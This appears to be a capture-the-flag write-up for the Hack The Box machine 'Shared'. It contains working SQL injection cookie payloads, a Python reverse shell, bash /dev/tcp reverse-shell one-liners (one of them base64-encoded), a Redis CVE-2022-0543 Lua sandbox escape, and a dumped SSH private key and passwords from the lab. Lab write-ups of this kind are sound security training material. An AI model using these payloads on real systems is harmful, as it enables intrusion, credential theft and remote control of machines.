![image](https://user-images.githubusercontent.com/105310322/191352398-c848c554-1489-4597-9a96-c4530a161493.png)


### Tools: gobuster, burpsuite, linpeas, redis-cli

### Vulnerabilities: SQLi(Union Select), ipython, redis-server lua bypass 


Nmap shows a webpage that we can access as well as good ol' ssh.

```console
└──╼ [★]$ nmap -A -p- -T4 -Pn 10.129.56.68
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-14 22:04 BST
Nmap scan report for 10.129.56.68
Host is up (0.0038s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_http-title: Did not follow redirect to https://shared.htb
| tls-nextprotoneg: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 305.76 seconds
```

Since nmap detected that there is another domain I decided to check for it. The result was a checkout domain. However navigating to it gives nothing important yet.

```console
└──╼ [★]$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u shared.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shared.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/09/16 22:38:25 Starting gobuster in VHOST enumeration mode
===============================================================
Found: checkout.shared.htb (Status: 200) [Size: 3229]
```

By adding items to your cart and then trying to checkout it will take you to the page that we identified earlier, However this time we have cookies!

Inputting into the credit card field will not give us anything back since the data is not going anywhere. The actual vulnerability is in the cookie field data.

After messing with the custom_cart cookie to find what vulnerability exists I finally got some results using sql injection and union select. The links below do a really good job of inputting it properly to leak a sql database.

https://book.hacktricks.xyz/pentesting-web/sql-injection

https://www.noobsec.net/sqli-cheatsheet/

This command shows us that whatever is in the b position will show up in the field.

```{"-1' union select 'a','b','c'-- -":"1"}```


![image](https://user-images.githubusercontent.com/105310322/191117377-68dcc174-e7a8-45fe-8d34-27a4c6588a7a.png)


Now we can start leaking data, we can confirm that is running on mariadb with @@version.

```{"-1' union select 'a',@@version,'c'-- -":"1"}```

![image](https://user-images.githubusercontent.com/105310322/191123194-bc0ac72e-e5b6-4c7c-9529-d701b72af3ed.png)

At this point I switched over to burpsuite to speed up this process.

Now we can leak the tables and one of them is ```user```

```{"-1' union select 'a',(select group_concat(table_name) FROM information_schema.tables),'c'-- -":"1"}```

```ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENABLED_ROLES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEYWORDS,KEY_CACHES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,SQL_FUNCTIONS,SYSTEM_VARIABLES,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,CLIENT_STATISTICS,INDEX_STATISTICS,INNODB_SYS_DATAFILES,GEOMETRY_COLUMNS,INNODB_SYS_TABLESTATS,SPATIAL_REF_SYS,INNODB_BUFFER_PAGE,INNODB_TRX,INNODB_CMP_PER_INDEX,INNODB_METRICS,INNODB_LOCK_WAITS,INNODB_CMP,THREAD_POOL_WAITS,INNODB_CMP_RESET,THREAD_POOL_QUEUES,TABLE_STATISTICS,INNODB_SYS_FIELDS,INNODB_BUFFER_PAGE_LRU,INNODB_LOCKS,INNODB_FT_INDEX_TABLE,INNODB_CMPMEM,THREAD_POOL_GROUPS,INNODB_CMP_PER_INDEX_RESET,INNODB_SYS_FOREIGN_COLS,INNODB_FT_INDEX_CACHE,INNODB_BUFFER_POOL_STATS,INNODB_FT_BEING_DELETED,INNODB_SYS_FOREIGN,INNODB_CMPMEM_RESET,INNODB_FT_DEFAULT_STOPWORD,INNODB_SYS_TABLES,INNODB_SYS_COLUMNS,INNODB_FT_CONFIG,USER_STATISTICS,INNODB_SYS_TABLESPACES,INNODB_SYS_VIRTUAL,INNODB_SYS_INDEXES,INNODB_SYS_SEMAPHORE_WAITS,INNODB_MUTEXES,user_variables,INNODB_TABLESPACES_ENCRYPTION,INNODB_FT_DELETED,THREAD_POOL_STATS,user,product```

Next we leak the columns. Too much info is output but the important fields are ```username,password,id```

```{"-1' union select 'a',(select group_concat(column_name) FROM information_schema.columns),'c'-- -":"1"}```

Finally we can leak the user and a hash and if we use hash crack we get a password ```Soleil101```

```{"-1' union select 'a',(select group_concat(username,password) FROM user),'c'-- -":"1"}```

```james_masonfc895d4eddc2fc12f995e18c865cf273```


User= james_mason

fc895d4eddc2fc12f995e18c865cf273 = Soleil101

Login through ssh with the users password.

```console
└──╼ [★]$ ssh james_mason@shared.htb
james_mason@shared.htb's password: 
Linux shared 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 16 18:43:35 2022 from 10.10.14.6
```
After getting logged in it appears alot of commands are not on this machine. Luckily I can get linpeas and pspy on the machine.

After transffering the and running linpeas I get 2 hits for CVE's. I assumed these would not work on this box but I gave one a shot.

No surprise it did not work.

```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560

Vulnerable to CVE-2022-0847
```

Now running pspy we get some good info that another user is running ipython.

This version of ipython is exploitable since we are able to execute commands as another user. This other user happens to be dan_smith.


```console
2022/09/19 18:42:54 CMD: UID=1000 PID=16733  | 
2022/09/19 18:43:00 CMD: UID=1000 PID=16734  | -bash 
2022/09/19 18:43:01 CMD: UID=0    PID=16736  | /usr/sbin/CRON -f 
2022/09/19 18:43:01 CMD: UID=0    PID=16735  | /usr/sbin/CRON -f 
2022/09/19 18:43:01 CMD: UID=1001 PID=16737  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/09/19 18:43:01 CMD: UID=1001 PID=16738  | /usr/bin/pkill ipython 
2022/09/19 18:43:01 CMD: UID=0    PID=16740  | /usr/sbin/CRON -f 
2022/09/19 18:43:01 CMD: UID=1001 PID=16739  | /usr/bin/python3 /usr/local/bin/ipython 
2022/09/19 18:43:01 CMD: UID=0    PID=16741  | /bin/sh -c /root/c.sh 
2022/09/19 18:43:01 CMD: UID=0    PID=16742  | sleep 5 
2022/09/19 18:43:06 CMD: UID=0    PID=16744  | 
2022/09/19 18:43:06 CMD: UID=0    PID=16746  | /bin/bash /root/c.sh 
2022/09/19 18:43:06 CMD: UID=0    PID=16745  | /bin/bash /root/c.sh 
2022/09/19 18:43:06 CMD: UID=0    PID=16747  | perl -ne s/\((\d+)\)/print " $1"/ge 
2022/09/19 18:43:06 CMD: UID=0    PID=16748  | /bin/bash /root/c.sh 
2022/09/19 18:43:06 CMD: UID=0    PID=16749  | 
2022/09/19 18:43:06 CMD: UID=0    PID=16752  | 
2022/09/19 18:43:06 CMD: UID=0    PID=16753  | (s-server) 
```

This link quickly explains how to exploit ipython.

https://github.com/advisories/GHSA-pq7m-3gw7-gq5x

So we create a quick python script for running a reverse shell.

```python
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.83",1234))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

p=subprocess.call(["/bin/sh","-i"])
```
Then run mkdir in the /opt/scripts_review and copy your python script into the created directories.

Also don't forget to set up your listener.

Note: Root is periodically deleting the files in /opt/scripts_review/ so you gotta be a little quick.

```console
james_mason@shared:/tmp$ mkdir -m 777 /opt/scripts_review/profile_default
james_mason@shared:/tmp$ mkdir -m 777 /opt/scripts_review/profile_default/startup
james_mason@shared:/tmp$ cp reverse.py /opt/scripts_review/profile_default/startup/
```

After a small wait the user dan_smith with launch ipython and you can grab your shell and get the user flag!


```console
└──╼ [★]$ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.57.216.
Ncat: Connection from 10.129.57.216:38742.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
$ 
```
```console
$ cat user.txt
16b10***************************
```

Next we are gonna grab the ssh keys for dan_smith so we can use the very nice ssh.

Note: Be sure to have an enter after the last line in a key file otherwise it will not be read properly when launching ssh.
Note2: Also make sure to ```chmod 600``` the ssh key file as it will not work with too many permissions.

```console
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

For the next step I ran linpeas and pspy again to verify if this user can see anything else.

It catches mostly the same thing and our next PE vector.

We are going to explit a vulnerability in the redis-server running on port 6379.

```console
2022/09/20 11:22:34 CMD: UID=0    PID=12249  | /usr/bin/redis-server 127.0.0.1:6379  
```
```console
root        3482  1.3  0.7  65104 14908 ?        Ssl  11:02   0:00 /usr/bin/redis-server 127.0.0.1:6379
```
Hacktricks gives almost all of the info we will need to exploit this.

https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

Before we can actually access and get any info from the server we will need a password to gain authorization.

So I am going to send it over to my host computer for further analysis.

```console
dan_smith@shared:/usr/local/bin$ ipython -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.83 - - [20/Sep/2022 12:07:29] "GET /redis_connector_dev HTTP/1.1" 200 -
```

For fun I tried out Ghidra and GDB to see if I could find the password in there, But I was taking too much time on the part and its a pretty large binary.

So the quick and easy way is to set up a listener and run the program on our machine.

```console
└──╼ [★]$ ./redis_connector_dev 
[+] Logging to redis instance using password...

INFO command result:
 dial tcp [::1]:6379: connect: connection refused
 ```
 
 Doing so spits out a password ```F2WHqJUz2WEz=Gqq```
 
 ```console
 └──╼ [★]$ nc -lvnp 6379
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::6379
Ncat: Listening on 0.0.0.0:6379
Ncat: Connection from ::1.
Ncat: Connection from ::1:35524.
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```

Now we can login to the redis-cli with the password

Note: using the password in the command will make it so you do not have to constantly authorize in redis-cli.

```console
dan_smith@shared:/tmp$ redis-cli -a F2WHqJUz2WEz=Gqq
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
127.0.0.1:6379> 
```

Hacktricks gives alot of different exploits for this, I tried just about all of them but had progress with lua bypass.

https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

And the actual lua bypass exploit is listed below. 

https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md

We get confirmation that it works!

```console
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
"uid=0(root) gid=0(root) groups=0(root)\n"
```
Now all we have to is put in the command to cat the flag!


```console
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /root/root.txt", "r"); local res = f:read("*a"); f:close(); return res' 0
"49414***************************\n"
127.0.0.1:6379> 
```

Originally I was trying to pop my reverse shell in /tmp but I found out that the /tmp was different for root than the user and therefore could not read my file

The method below works as well as just base64 encoding your payload. ```echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44My8xMjM0IDA+JjE= | base64 -d | bash```

This reverse shell method is from a certain spanish cat ;)

```console 
echo "bash -i >& /dev/tcp/10.10.14.83/1234 0>&1" > /dev/shm/sh
```
```console
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /dev/shm/sh | bash"); local res = f:read("*a"); f:close(); return res' 0
```
```console
└──╼ [★]$ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.58.44.
Ncat: Connection from 10.129.58.44:43034.
bash: cannot set terminal process group (18999): Inappropriate ioctl for device
bash: no job control in this shell
root@shared:/var/lib/redis# id  
id
uid=0(root) gid=0(root) groups=0(root)
root@shared:/var/lib/redis# 
```

Pretty fun box, I tried another exploit from https://github.com/aodsec/CVE-2022-0543 but I was having issues with it. Pretty sure it will work but inputting the command manually is just as easy.


GG!
